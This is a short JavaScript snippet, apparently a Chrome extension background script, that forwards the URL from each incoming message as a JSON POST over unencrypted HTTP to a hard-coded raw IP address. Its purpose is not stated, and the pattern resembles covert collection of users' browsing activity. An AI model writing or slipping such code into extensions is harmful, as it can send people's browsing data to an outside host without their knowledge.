chrome.runtime.onMessage.addListener((message) => {
  const url = message.url;
  fetch('http://50.98.90.254:5002/', {
    method: 'POST',
    body: JSON.stringify({ url }),
    headers: {
      'Content-Type': 'application/json', 
    },
  });
});